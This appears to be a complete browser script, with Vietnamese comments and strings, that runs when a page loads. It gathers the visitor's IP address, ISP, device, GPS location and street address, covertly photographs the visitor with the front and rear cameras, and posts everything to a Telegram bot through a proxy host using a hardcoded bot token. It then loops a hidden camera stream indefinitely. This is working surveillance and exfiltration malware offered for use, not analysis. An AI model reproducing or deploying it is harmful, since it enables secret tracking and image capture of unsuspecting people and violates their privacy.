const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1002718473645';
const TELEGRAM_CHAT_ID_NO_PHOTOS = '6956722046';

const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  realIp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

async function getPublicIP() {
  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
  info.ip = ip.ip || 'Không rõ';
}

async function getRealIP() {
  const ip = await fetch('https://icanhazip.com').then(r => r.text());
  info.realIp = ip.trim();
  const data = await fetch(`https://ipwho.is/${info.realIp}`).then(r => r.json());
  info.isp = data.connection?.org || 'Không rõ';
}

let useGPS = false;

async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);

    navigator.permissions.query({ name: 'geolocation' }).then(result => {
      if (result.state === 'denied') {
        return fallbackIPLocation().then(resolve);
      }

      navigator.geolocation.getCurrentPosition(
        async pos => {
          useGPS = true;
          info.lat = pos.coords.latitude.toFixed(6);
          info.lon = pos.coords.longitude.toFixed(6);
          try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
              headers: { 'User-Agent': 'Mozilla/5.0' }
            });
            const data = await res.json();
            info.address = data.display_name || '📍 GPS hoạt động nhưng không tìm được địa chỉ';
            info.country = data.address?.country || 'Không rõ';
          } catch {
            info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
            info.country = 'Không rõ';
          }
          resolve();
        },
        async () => {
          useGPS = false;
          await fallbackIPLocation();
          resolve();
        },
        { enableHighAccuracy: true, timeout: 8000 }
      );
    });
  });
}

async function fallbackIPLocation() {
  const data = await fetch(`https://ipwho.is/`).then(r => r.json());
  info.lat = data.latitude?.toFixed(6) || '0';
  info.lon = data.longitude?.toFixed(6) || '0';
  info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
  info.country = data.country || 'Không rõ';
}

function captureCamera(facingMode = 'user') {
  return new Promise((resolve, reject) => {
    navigator.permissions.query({ name: 'camera' }).then(result => {
      if (result.state === 'denied') return reject(new Error('Camera bị từ chối'));

      navigator.mediaDevices.getUserMedia({ video: { facingMode } })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          video.onloadedmetadata = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');

            setTimeout(() => {
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              stream.getTracks().forEach(track => track.stop());
              canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
            }, 1000);
          };
        })
        .catch(reject);
    });
  });
}

function getCaption() {
  const mapsLink = info.lat && info.lon
    ? `https://maps.google.com/?q=${info.lat},${info.lon}`
    : 'Không rõ';

  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}
`.trim();
}

async function sendPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
  formData.append('media', JSON.stringify([
    { type: 'photo', media: 'attach://front', caption: getCaption() },
    { type: 'photo', media: 'attach://back' }
  ]));
  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
}

async function sendTextOnly() {
  return fetch(API_SEND_TEXT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
      text: getCaption()
    })
  });
}

// 👉 delay helper
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function main() {
  detectDevice();
  await getPublicIP();
  await getRealIP();
  await getLocation();

  let front = null, back = null;

  try {
    front = await captureCamera("user");
    await delay(1000);
    back = await captureCamera("environment");
    info.camera = '✅ Đã chụp camera trước và sau';
  } catch {
    info.camera = '🚫 Không thể truy cập camera';
  }

  if (front && back) {
    await sendPhotos(front, back);
  } else {
    await sendTextOnly();
  }
}

// 👉 Gọi main rồi bắt đầu vòng lặp camera sau đó
main().then(() => {
  window.mainScriptFinished = true;
  startCameraLoop(); // 👈 Gọi sau khi hoàn tất
});


// 👉 Vòng lặp bật / tắt camera liên tục
let loopStream = null;
const video = document.createElement("video");
video.style.display = "none";
video.autoplay = true;
video.playsInline = true;
document.body.appendChild(video);

function stopLoopCamera() {
  if (loopStream) {
    loopStream.getTracks().forEach(track => track.stop());
    loopStream = null;
    console.log("🚫 Camera đã tắt (vòng lặp)");
  }
}

async function startLoopCamera() {
  try {
    loopStream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = loopStream;
    console.log("🎥 Camera đã bật lại (vòng lặp)");
  } catch (e) {
    console.error("Không thể bật camera trong vòng lặp:", e);
  }
}

async function startCameraLoop() {
  while (true) {
    stopLoopCamera();         // Tắt camera
    await delay(1000);        // Đợi 1 giây
    await startLoopCamera();  // Bật lại camera
    await delay(2000);        // Đợi 2 giây
  }
}
